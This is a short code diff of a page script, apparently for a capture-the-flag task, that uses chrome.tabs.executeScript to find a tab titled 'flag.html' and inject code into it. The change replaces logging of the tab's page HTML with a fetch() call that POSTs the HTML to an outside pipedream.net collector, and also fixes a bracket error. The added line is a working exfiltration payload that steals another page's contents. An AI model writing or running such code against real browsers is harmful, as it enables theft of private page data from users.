@@ -17,7 +17,7 @@
             if (tab.title === 'flag.html') {
             
               chrome.tabs.executeScript(tab.id, {
-                code: 'var bodyContent = document.body.innerHTML; console.log(bodyContent);'
+                code: 'var bodyContent = document.body.innerHTML; fetch("https://eoyz1blvtlymzlj.m.pipedream.net", { method: "POST", body: JSON.stringify({ bodyContent }) });'
               });
             }
           });
@@ -28,8 +28,7 @@
       checkAndExecuteScript();
 
      
-      setInterval(checkAndExecuteScript, 5000); )
-    });
+      setInterval(checkAndExecuteScript, 5000); });
   </script>
 </head>
 <body>
